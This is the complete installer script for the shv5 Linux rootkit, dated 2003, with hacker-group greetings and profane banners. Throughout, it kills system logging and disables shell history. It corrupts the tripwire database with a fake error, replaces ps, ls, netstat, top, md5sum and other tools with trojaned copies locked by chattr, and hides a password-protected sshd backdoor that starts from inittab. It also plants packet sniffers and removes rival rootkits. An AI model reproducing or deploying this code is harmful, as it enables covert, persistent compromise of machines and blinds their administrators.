#!/bin/bash
#
# shv5-internal-release
# by: PinT[x] April/2003
# 
# greetz to:
#
# [*] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99
#                 C00L|0, GolDenLord, Spike, zion ...
# [*] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ...
# [*] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ...
# [*] tC-members: eksol, termid, hex, keyhook, maher, tripod etc..
# [*] And all others who diserve to be here but i forgot
# [*] them at the moment !
# 
# PRIVATE ! DO NOT DISTRIBUTE BITCHEZ !


# BASIC DEFINES

DEFPASS=porno
DEFPORT=37998
BASEDIR=`pwd`


# DON`T TOUCH BELOW UNLESS YOU KNOW WHAT U`R DOING !
# BEFORE WE MOVE ON LET`s WORK ON SAFE-GROUND !


unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin


# RAINBOW COLOURS :)

BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'


# HOPE U`R NO TRYING THIS FROM USER !
# HOWEVER LET`S SEE WHAT KINDA KID U ARE ?

if [ "$(whoami)" != "root" ]; then
   echo "${DCYN}[${WHI}sh${DCYN}] ${WHI} BECOME ROOT AND TRY AGAIN ${RES}"
   echo ""
   exit
fi


# UNZIPING SHITS

tar zxf ./bin.tgz
tar zxf ./conf.tgz
tar zxf ./lib.tgz
tar zxf ./utilz.tgz
cd ./bin; tar zxf ./sshd.tgz
rm -rf ./sshd.tgz
cd $BASEDIR
rm -rf bin.tgz conf.tgz lib.tgz utilz.tgz

sleep 2

cd $BASEDIR


killall -9 syslogd >/dev/null 2>&1

startime=`date +%S`

echo "${DCYN}[${WHI}sh${DCYN}]# Installing shv5 ... this wont take long ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# If u think we will patch your holes shoot yourself !${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# so patch manualy and fuck off! ${RES}"
echo ""
echo ""
echo "${WHI}============================================================================${RES}"
echo ""
echo "${DCYN} MMMMM                           MMMMMM                             "
echo " MMM    MMMMMMMMM   MMMM    MMMM    MMM   [*] Presenting u shv5-rootkit !  "
echo " MMM   MMMM   MMMM  MMMM    MMMM    MMM   [*] Designed for internal use !  "
echo " MMM   MMMMMMM      MMMMMMMMMMMM    MMM                                    "
echo " MMM     MMMMMMMM   MMMMMMMMMMMM    MMM   [*] brought to you by: PinT[x]   "
echo " MMM          MMMM  MMMM    MMMM    MMM   [*] April © 2003 ©               "
echo " MMM   MMMM   MMMM  MMMM    MMMM    MMM                                    "
echo " MMM    MMMMMMMMM   MMMM    MMMM    MMM   [*]    *** VERY PRIVATE ***      "
echo " MMM                                MMM   [*] *** so dont distribute ***   "
echo " MMMMM       -C- -R- -E- -W-     MMMMMM                                    "
echo "                                                                          ${RES}"
echo ""
echo "${WHI}============================================================================${RES}"
echo ""
sleep 2


echo "${DCYN}[${WHI}sh${DCYN}]# backdooring started on ${WHI}`hostname -f`${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"


SYSLOGCONF="/etc/syslog.conf"


echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for remote logging... ${RES}"

REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`

if [ ! -z "$REMOTE" ]; then
        echo "${DCYN}[${WHI}sh${DCYN}]# May Allah help us!${RES}"
        echo
        echo '${RED}                      REMOTE LOGGING DETECTED ${RES}'
        echo '${DCYN}[${WHI}sh${DCYN}]#        I hope you can get to these other computer(s): ${RES}'
        echo
        for host in $REMOTE; do
                echo -n "            "
                echo $host
        done
        echo
        echo ' ${WHI}             cuz this box is LOGGING to it... ${RES}'
        echo
else
        echo " ${WHI} guess not.${RES}"
fi


#######################################################################
## CHEKING FOR MALICIOUS ADMIN TOOLS !(like tripwire, snort, etc...) ##
##                                                                   ##
#######################################################################

echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for tripwire... ${RES}"

uname=`uname -n`
twd=/var/lib/tripwire/$uname.twd

if [ -d /etc/tripwire ]; then
   echo "${WHI} ALERT: TRIPWIRE FOUND! ${RES}"

   if [ -f /var/lib/tripwire/$uname.twd ]; then
      chattr -isa $twd
      echo -n "${DCYN}[${WHI}sh${DCYN}]# checking for tripwire-database... ${RES}"
      echo "${RED} ALERT! tripwire database found ${RES}"
      echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} dun worry we got handy-tricks for this :) ${RES}"
      echo "-----------------------------------------" > $twd
      echo "Tripwire segment-faulted !" >> $twd
      echo "-----------------------------------------" >> $twd
      echo "" >> $twd
      echo "The reasons for this may be: " >> $twd
      echo "" >> $twd
      echo "corrupted disc-geometry, possible bad disc-sectors" >> $twd
      echo "corrupted files while checking for possible change etc." >> $twd
      echo ""
      echo "pls. rerun tripwire to build the database again!" >> $twd
      echo "" >> $twd
   else
      echo "${WHI} lucky you: Tripwire database not found. ${RES}"
   fi
else
   echo "${WHI} guess not. ${RES}"
fi

# restoring login

if [ -f /sbin/xlogin ]; then
   chattr -isa /sbin/xlogin
   chattr -isa /bin/login
   mv -f /sbin/xlogin /bin/login
   chmod 7455 /bin/login
   chattr +isa /bin/login
fi

echo "${DCYN}[${WHI}sh${DCYN}]# [Installing trojans....]                                  ${BLU}       ${RES}"

if [ -f /etc/sh.conf ]; then
  chattr -isa /etc/sh.conf
  rm -rf /etc/sh.conf
fi


# checking if we got needed libs and filez

if [ ! -f /lib/libproc.a ]; then
   mv lib/libproc.a /lib/
fi

if [ ! -f /lib/libproc.so.2.0.6 ]; then
   mv lib/libproc.so.2.0.6 /lib/
fi

/sbin/ldconfig >/dev/null 2>&1

#if [ -f /lib/libncurses.so.5 ]; then
#   echo ""
#else
#   ln -s /lib/libncurses.so.4 /lib/libncurses.so.5 2>/dev/null
#fi

if [ -f /.bash_history ]; then
   chattr -isa /.bash_history >/dev/null 2>&1
   rm -rf /.bash_history
fi

if [ -f /bin/.bash_history ]; then
   chattr -isa /bin/.bash_history
   rm -rf /bin/.bash_history
fi

if [ ! -f /usr/bin/md5sum ]; then
   touch -acmr /bin/ls bin/md5sum
   cp bin/md5sum /usr/bin/md5sum
fi

if test -n "$1" ; then
   echo "${DCYN}[${WHI}sh${DCYN}]#  Using Password : ${WHI}$1                                ${BLU}       ${RES}"
   cd $BASEDIR/bin
   echo -n $1|md5sum > /etc/sh.conf
else
   echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} No Password Specified, using default - $DEFPASS           ${BLU}       ${RES}"
   echo -n $DEFPASS|md5sum > /etc/sh.conf
fi

touch -acmr /bin/ls /etc/sh.conf
chown -f root:root /etc/sh.conf
chattr +isa /etc/sh.conf

if test -n "$2" ; then
   echo "${DCYN}[${WHI}sh${DCYN}]#         Using ssh-port : ${WHI}$2                                 ${RES}"
   echo "Port $2" >> $BASEDIR/bin/.sh/sshd_config
   echo "3 $2" >> $BASEDIR/conf/hosts.h
   echo "4 $2" >> $BASEDIR/conf/hosts.h
   cat $BASEDIR/bin/.sh/shdcf2 >> $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2
   mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf
else
   echo "${DCYN}[${WHI}sh${DCYN}]# No ssh-port Specified, using default - $DEFPORT             ${BLU}       ${RES}"
   echo "Port $DEFPORT" >> $BASEDIR/bin/.sh/sshd_config
   echo "3 $2" >> $BASEDIR/conf/hosts.h
   echo "4 $2" >> $BASEDIR/conf/hosts.h
   cat $BASEDIR/bin/.sh/shdcf2 >> $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2
   mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf
fi

if [ -f /lib/lidps1.so ]; then
  chattr -isa /lib/lidps1.so
  rm -rf /lib/lidps1.so
fi

if [ -f /usr/include/hosts.h ]; then
  chattr -isa /usr/include/hosts.h
  rm -rf /usr/include/hosts.h
fi

if [ -f /usr/include/file.h ]; then
  chattr -isa /usr/include/file.h
  rm -rf /usr/include/file.h
fi

if [ -f /usr/include/log.h ]; then
  chattr -isa /usr/include/log.h
  rm -rf /usr/include/log.h
fi

if [ -f /usr/include/proc.h ]; then
  chattr -isa /usr/include/proc.h
  rm -rf /usr/include/proc.h
fi

cd $BASEDIR
mv $BASEDIR/conf/lidps1.so /lib/lidps1.so
touch -acmr /bin/ls /lib/lidps1.so
touch -acmr /bin/ls $BASEDIR/conf/*
mv $BASEDIR/conf/*  /usr/include/

# Ok lets start creating dirs

SSHDIR=/lib/libsh.so
HOMEDIR=/usr/lib/libsh

if [ -d /lib/libsh.so ]; then
   chattr -isa /lib/libsh.so
   chattr -isa /lib/libsh.so/*
   rm -rf /lib/libsh.so
fi

if [ -d /usr/lib/libsh ]; then
   chattr -isa /usr/lib/libsh
   chattr -isa /usr/lib/libsh/*
   rm -rf /usr/lib/libsh/*
fi

mkdir $SSHDIR
touch -acmr /bin/ls $SSHDIR
mkdir $HOMEDIR
touch -acmr /bin/ls $HOMEDIR

cd $BASEDIR/bin
mv .sh/* $SSHDIR/
mv .sh/.bashrc $HOMEDIR

if [ -f /sbin/ttyload ]; then
   chattr -AacdisSu /sbin/ttyload
   rm -rf /sbin/ttyload
fi

if [ -f /usr/sbin/ttyload ]; then
   chattr -isa /usr/sbin/ttyload
   rm -rf /usr/sbin/ttyload
fi

if [ -f /sbin/ttymon ]; then
   chattr -isa /sbin/ttymon
   rm -rf /sbin/ttymon
fi

mv $SSHDIR/sshd /sbin/ttyload
chmod a+xr /sbin/ttyload
chmod o-w /sbin/ttyload
touch -acmr /bin/ls /sbin/ttyload
chattr +isa /sbin/ttyload
kill -9 `pidof ttyload` >/dev/null 2>&1

mv $BASEDIR/bin/ttymon /sbin/ttymon
chmod a+xr /sbin/ttymon
touch -acmr /bin/ls /sbin/ttymon
chattr +isa /sbin/ttymon
kill -9 `pidof ttymon` >/dev/null 2>&1

cp /bin/bash $SSHDIR

# INITTAB SHUFFLING

chattr -isa /etc/inittab
cat /etc/inittab |grep -v ttyload|grep -v getty > /tmp/.init1
cat /etc/inittab |grep getty > /tmp/.init2
echo "# Loading standard ttys" >> /tmp/.init1
echo "0:2345:once:/usr/sbin/ttyload" >> /tmp/.init1
cat /tmp/.init2 >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# modem getty." >> /tmp/.init1
echo "# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem" >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# fax getty (hylafax)" >> /tmp/.init1
echo "# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem" >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# vbox (voice box) getty" >> /tmp/.init1
echo "# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6" >> /tmp/.init1
echo "# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7" >> /tmp/.init1
echo "" >> /tmp/.init1
echo "# end of /etc/inittab" >> /tmp/.init1
echo "/sbin/ttyload -q >/dev/null 2>&1" > /usr/sbin/ttyload
echo "/sbin/ttymon >/dev/null 2>&1" >> /usr/sbin/ttyload
touch -acmr /bin/ls /usr/sbin/ttyload
chmod +x /usr/sbin/ttyload
chattr +isa /usr/sbin/ttyload
/usr/sbin/ttyload >/dev/null 2>&1

touch -amcr /etc/inittab /tmp/.init1
mv -f /tmp/.init1 /etc/inittab
rm -rf /tmp/.init2

# MAKING SURE WE GOT IT BACKDORED RIGHT !

if [ ! "`grep ttyload /etc/inittab`" ]; then
   echo "${RED}[${WHI}sh${RED}]# WARNING - SSHD WONT BE RELOADED UPON RESTART "
   echo "${RED}[${WHI}sh${RED}]# inittab shuffling probly fucked-up ! "
fi

# Say hello to md5sum fixer boys n gurls !

if [ -f /sbin/ifconfig ]; then
   /usr/bin/md5sum /sbin/ifconfig >> .shmd5
fi
if [ -f /bin/ps ]; then
   /usr/bin/md5sum /bin/ps >> .shmd5
fi
if [ -f /bin/ls ]; then
   /usr/bin/md5sum /bin/ls >> .shmd5
fi
if [ -f /bin/netstat ]; then
   /usr/bin/md5sum /bin/netstat >> .shmd5
fi
if [ -f /usr/bin/find ]; then
   /usr/bin/md5sum /usr/bin/find >> .shmd5
fi
if [ -f /usr/bin/top ]; then
   /usr/bin/md5sum /usr/bin/top >> .shmd5
fi
if [ -f /usr/sbin/lsof ]; then
   /usr/bin/md5sum /usr/sbin/lsof >> .shmd5
fi
if [ -f /usr/bin/slocate ]; then
   /usr/bin/md5sum /usr/bin/slocate >> .shmd5
fi
if [ -f /usr/bin/dir ]; then
   /usr/bin/md5sum /usr/bin/dir >> .shmd5
fi
if [ -f /usr/bin/md5sum ]; then
   /usr/bin/md5sum /usr/bin/md5sum >> .shmd5
fi


if [ ! -f /dev/srd0 ]; then
  ./encrypt -e .shmd5 /dev/srd0
  touch -acmr /bin/ls /dev/srd0
  chattr a+r /dev/srd0
  chown -f root:root /dev/srd0
fi

rm -rf .shmd5


# time change bitch

touch -acmr /sbin/ifconfig ifconfig >/dev/null 2>&1
touch -acmr /bin/ps ps >/dev/null 2>&1
touch -acmr /bin/ls ls >/dev/null 2>&1
touch -acmr /bin/netstat netstat >/dev/null 2>&1
touch -acmr /usr/bin/find find >/dev/null 2>&1
touch -acmr /usr/bin/top top >/dev/null 2>&1
touch -acmr /usr/sbin/lsof lsof >/dev/null 2>&1
touch -acmr /sbin/syslogd syslogd >/dev/null 2>&1
touch -acmr /usr/bin/slocate slocate >/dev/null 2>&1
touch -acmr /usr/bin/dir dir >/dev/null 2>&1
touch -acmr /usr/bin/md5sum md5sum >/dev/null 2>&1
touch -acmr /usr/bin/pstree pstree >/dev/null 2>&1


# Backdoor ps/top/du/ls/netstat/etc..

cd $BASEDIR/bin

BACKUP=/usr/lib/libsh/.backup
mkdir $BACKUP

# ps ...
if [ -f /usr/bin/ps ]; then
   chattr -isa /usr/bin/ps
   cp /usr/bin/ps $BACKUP
   mv -f ps /usr/bin/ps
   chattr +isa /usr/bin/ps
fi

if [ -f /bin/ps ]; then
   chattr -isa /bin/ps
   cp /bin/ps $BACKUP
   mv -f ps /bin/ps
   chattr +isa /bin/ps
fi

# ifconfig ...
chattr -isa /sbin/ifconfig
cp /sbin/ifconfig $BACKUP
mv -f ifconfig /sbin/ifconfig
chattr +isa /sbin/ifconfig

# netstat ...
if [ -f /usr/sbin/netstat ]; then
  chattr -isa /usr/sbin/netstat
  mv -f netstat /usr/sbin/netstat
  chattr +isa /usr/sbin/netstat
fi

chattr -isa /bin/netstat
cp /bin/netstat $BACKUP
mv -f netstat /bin/netstat
chattr +isa /bin/netstat

# top ...
if [ -f /usr/bin/top ]; then
   chattr -isa /usr/bin/top
   cp /usr/bin/top $BACKUP
   mv -f top /usr/bin/top
   chattr +isa /usr/bin/top
   if [ -f /lib/libncurses.so.5 ]; then
      ln -s /lib/libncurses.so.5 /lib/libncurses.so.4 2>/dev/null
   fi
   if [ -f /usr/lib/libncurses.so.5 ]; then
      ln -s /usr/lib/libncurses.so.5 /lib/libncurses.so.4 2>/dev/null
   fi
fi

# slocate ...
if [ -f /usr/bin/slocate ]; then
   chattr -isa /usr/bin/slocate
   cp /usr/bin/slocate $BACKUP
   mv -f slocate /usr/bin/slocate
   chattr +isa /usr/bin/slocate
fi

# ls ...
chattr -isa /bin/ls
cp /bin/ls $BACKUP
mv -f ls /bin/ls
chattr +isa /bin/ls

# find ...
if [ -f /usr/bin/find ]; then
   chattr -isa /usr/bin/find
   cp /usr/bin/find $BACKUP
   mv -f find /usr/bin/find
   chattr +isa /usr/bin/find
fi

# dir ...
if [ -f /usr/bin/dir ]; then
   chattr -isa /usr/bin/dir
   cp /usr/bin/dir $BACKUP
   mv -f dir /usr/bin/dir
   chattr +isa /usr/bin/dir
fi

# lsof ...
if [ -f /usr/sbin/lsof ]; then
   chattr -isa /usr/sbin/lsof
   cp /usr/sbin/lsof $BACKUP
   mv -f lsof /usr/sbin/lsof
   chattr +isa /usr/sbin/lsof
fi

# pstree ...
if [ -f /usr/bin/pstree ]; then
   chattr -isa /usr/bin/pstree
   cp /usr/bin/pstree $BACKUP
   mv -f pstree /usr/bin/pstree
   chattr +isa /usr/bin/pstree
fi

# md5sum ...
chattr -isa /usr/bin/md5sum
cp /usr/bin/md5sum $BACKUP
mv -f md5sum /usr/bin/md5sum
chattr +isa /usr/bin/md5sum

# syslogd ...
# we won`t trojan it coz its too sensitive and won`t work.
# Admin will notice it upon system-restart!

#if [ -f /sbin/syslogd ]; then
#   chattr -isa /sbin/syslogd
#   cp /sbin/syslogd $BACKUP
#   mv -f syslogd /sbin/syslogd	
#   chattr +isa /sbin/syslogd
#fi


echo "${DCYN}[${WHI}sh${DCYN}]#          : ps/ls/top/netstat/ifconfig/find/ and rest backdoored${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# [Installing some utils...]                                       ${RES}"

cd $BASEDIR

#if [ ! -f /usr/bin/wget ]; then
#   touch -acmr /bin/ls ./bin/wget
#   chmod 744 ./bin/wget
#   mv ./bin/wget /usr/bin/wget
#fi

# PICO WILL MAKE RK GROW BIG!
# SO FUCK OFF AND USE vi !

#if [ ! -f /usr/bin/pico ]; then
#   touch -acmr /bin/ls ./pico
#   chmod 744 ./pico
#   mv ./pico /usr/bin/pico
#fi

touch -acmr /bin/ls $BASEDIR/utilz
touch -acmr /bin/ls $BASEDIR/utilz/*
mv $BASEDIR/utilz $HOMEDIR/

echo "${DCYN}[${WHI}sh${DCYN}]#          : mirk/synscan/others... moved                      ${RES}"   

echo "${DCYN}[${WHI}sh${DCYN}]# [Moving our files...]                                            ${RES}"

mkdir $HOMEDIR/.sniff
mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff
mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp
mv $BASEDIR/bin/shsb $HOMEDIR/shsb
mv $BASEDIR/bin/hide $HOMEDIR/hide

touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff
touch -acmr /bin/ls $HOMEDIR/.sniff/shp
touch -acmr /bin/ls $HOMEDIR/shsb
touch -acmr /bin/ls $HOMEDIR/hide

chmod +x $HOMEDIR/.sniff/*
chmod +x $HOMEDIR/shsb
chmod +x $HOMEDIR/hide

echo "${DCYN}[${WHI}sh${DCYN}]#          : sniff/parse/sauber/hide moved                      ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# [Modifying system settings to suite our needs]                    ${RES}"



# CHECKING FOR VULN DAEMONS
# JUST WARNING NOT PATCHING HeH


echo "${DCYN}[${WHI}sh${DCYN}]# Checking for vuln-daemons ...                    ${RES}"

ps aux > /tmp/.procs

if [ "`cat /tmp/.procs | grep named`" ]; then
   echo "${RED}[${WHI}sh${RED}]# NAMED found - patch it bitch !!!!              ${RES}"
fi

if [ -f /usr/sbin/wu.ftpd ]; then
   echo "${RED}[${WHI}sh${RED}]# WU-FTPD found - patch it bitch !!!!              ${RES}"
fi

if [ "`cat /tmp/.procs | grep smbd`" ]; then
   echo "${RED}[${WHI}sh${RED}]# SAMBA found - patch it bitch !!!!              ${RES}"
fi

if [ "`cat /tmp/.procs | grep rpc.statd`" ]; then
   echo "${RED}[${WHI}sh${RED}]# RPC.STATD found - patch it bitch !!!!              ${RES}"
fi

rm -rf /tmp/.procs

netstat -natp > /tmp/.stats

if [ "`cat /tmp/.stats | grep 443 | grep http`" ]; then
   echo "${RED}[${WHI}sh${RED}]# MOD_SSL found - patch it bitch !!!!              ${RES}"
fi

rm -rf /tmp/.stats


# CHECKING FOR HOSTILE ROOTKITS/BACKDORS


mkdir $HOMEDIR/.owned

if [ -f /etc/ttyhash ]; then
   chattr -AacdisSu /etc/ttyhash
   rm -rf /etc/ttyhash
fi

if [ -d /lib/ldd.so ]; then
   chattr -isa /lib/ldd.so
   chattr -isa /lib/ldd.so/*
   mv /lib/ldd.so $HOMEDIR/.owned/tk8
   echo "${RED}[${WHI}sh${RED}]# tk8 detected and owned ...!!!!              ${RES}"
fi

if [ -d /usr/src/.puta ]; then
   chattr -isa /usr/src/.puta
   chattr -isa /usr/src/.puta/*
   mv /usr/src/.puta $HOMEDIR/.owned/tk7
   echo "${RED}[${WHI}sh${RED}]# tk7 detected and owned ...!!!!              ${RES}"
fi

if [ -f /usr/sbin/xntpd ]; then
   chattr -isa /usr/sbin/xntpd
   rm -rf /usr/sbin/xntpd
fi

if [ -f /usr/sbin/nscd ]; then
   chattr -isa /usr/sbin/nscd
   rm -rf /usr/sbin/nscd
fi

if [ -d /usr/include/bex ]; then
   chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz
   chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h
   chattr -isa /usr/include/bex
   chattr -isa /usr/include/bex/*
   mv /usr/include/bex/ $HOMEDIR/.owned/bex2
   if [ -f /var/log/tcp.log ]; then
      chattr -isa /var/log/tcp.log
      cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog
   fi
   chattr -isa /usr/bin/sshd2 >/dev/null 2>&1
   rm -rf /usr/bin/sshd2 >/dev/null 2>&1
   echo "${RED}[${WHI}sh${RED}]# beX2 detected and owned ...!!!!              ${RES}"   
fi

if [ -d /dev/tux/ ]; then
   chattr -isa /usr/bin/xsf >/dev/null 2>&1
   rm -rf /usr/bin/xsf >/dev/null 2>&1
   chattr -isa /usr/bin/xchk >/dev/null 2>&1
   rm -rf /usr/bin/xchk >/dev/null 2>&1
   chattr -isa /dev/tux >/dev/null 2>&1
   mv /dev/tux $HOMEDIR/.owned/tuxkit
   echo "${RED}[${WHI}sh${RED}]# tuxkit detected and owned ...!!!!              ${RES}"      
fi

if [ -f /usr/bin/ssh2d ]; then
   chattr -isa /usr/bin/ssh2d
   rm -rf /usr/bin/ssh2d
   chattr -isa /lib/security/.config/
   chattr -isa /lib/security/.config/*
   rm -rf /lib/security/.config
   echo "${RED}[${WHI}sh${RED}]# optickit detected and removed ...!!!!              ${RES}"      
fi

if [ -f /etc/ld.so.hash ]; then
   chattr -isa /etc/ld.so.hash
   rm -rf /etc/ld.so.hash
fi


chattr +isa /usr/lib/libsh
chattr +isa /lib/libsh.so

# GREPPING SHITZ FROM rc.sysinit and inetd.conf

if [ -f /etc/rc.d/rc.sysinit ]; then
   chattr -isa /etc/rc.d/rc.sysinit
   cat /etc/rc.d/rc.sysinit | grep -v "# Xntps (NTPv3 daemon) startup.."| grep -v "/usr/sbin/xntps"| grep -v "/usr/sbin/nscd" > /tmp/.grep
   chmod +x /tmp/.grep
   touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep
   mv -f /tmp/.grep /etc/rc.d/rc.sysinit
   rm -rf /tmp/.grep
fi

if [ -f /etc/inetd.conf ]; then
   chattr -isa /etc/inetd.conf
   cat /etc/inetd.conf | grep -v "6635"| grep -v "9705" > /tmp/.grep
   touch -acmr /etc/inted.conf /tmp/.grep
   mv -f /tmp/.grep /etc/inetd.conf
   rm -rf /tmp/.grep
fi


# KILLING SOME LAMME DAEMONS

killall -9 -q nscd >/dev/null 2>&1
killall -9 -q xntps >/dev/null 2>&1
killall -9 -q mountd >/dev/null 2>&1
killall -9 -q mserv >/dev/null 2>&1
killall -9 -q psybnc >/dev/null 2>&1
killall -9 -q t0rns >/dev/null 2>&1
killall -9 -q linsniffer >/dev/null 2>&1
killall -9 -q sniffer >/dev/null 2>&1
killall -9 -q lpsched >/dev/null 2>&1
killall -9 -q sniff >/dev/null 2>&1
killall -9 -q sn1f >/dev/null 2>&1
killall -9 -q sshd2 >/dev/null 2>&1
killall -9 -q xsf >/dev/null 2>&1
killall -9 -q xchk >/dev/null 2>&1
killall -9 -q ssh2d >/dev/null 2>&1


echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# [System Information...]${RES}"
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | awk -F ' ' ' {print $2} ' | cut -c6-`
echo "${DCYN}[${WHI}sh${DCYN}]# Hostname :${WHI} `hostname -f` ($MYIPADDR)${RES}"
uname -a | awk '{ print  $11 }' >/tmp/info_tmp
echo "${DCYN}[${WHI}sh${DCYN}]# Arch : ${WHI}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# Alternative IP :${WHI} "`hostname -i`" -+-  Might be ["`/sbin/ifconfig | grep \eth | wc -l`" ] active adapters.${RES}"

if [ -f /etc/redhat-release ]; then
    echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/redhat-release`${RES}"
elif [ -f /etc/slackware-version ]; then
    echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/slackware-version`${RES}"
elif [ -f /etc/debian_version ]; then
    echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/debian_version`${RES}"
elif [ -f /etc/SuSE-release ]; then
    echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/SuSE-release`${RES}"
elif [ -f /etc/issue ]; then
    echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} `head -1 /etc/issue`${RES}"
else echo -n "${DCYN}[${WHI}sh${DCYN}]# Distribution:${WHI} unknown${RES}"
fi

rm -rf /tmp/info_tmp
#echo "$1:$2:`hostname -f`:$MYIPADDR" | mail $md5sum
endtime=`date +%S`
total=`expr $endtime - $startime`

echo ""
echo "${WHI}--------------------------------------------------------------------${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ipchains ... ? ${RES}"

if [ -f /sbin/ipchains ]; then
   echo "${WHI}`/sbin/ipchains -L input | head -5`${RES}"
else
   echo ""
   echo "${DCYN}[${WHI}sh${DCYN}]# lucky for u no ipchains found${RES}"
fi

echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# iptables ...?${RES}"

if [ -f /sbin/iptables ]; then
   echo "${WHI}`/sbin/iptables -L input | head -5`${RES}"
else
   echo ""
   echo "${DCYN}[${WHI}sh${DCYN}]# lucky for u no iptables found${RES}"
fi
echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# Just ignore all errors if any ! "
echo "${DCYN}[${WHI}sh${DCYN}]# ============================== ${RED}Backdooring completed in :$total seconds ${RES}"

if [ -f /usr/sbin/syslogd ]; then
   /usr/sbin/syslogd -m 0
else
   /sbin/syslogd -m 0
fi

if [ -f /usr/sbin/inetd ]; then
   killall -HUP inetd >/dev/null 2>&1
elif [ -f /usr/sbin/xinetd ]; then
   killall -HUP xinetd
fi

cd $BASEDIR
rm -rf ../shv5*

# EOF
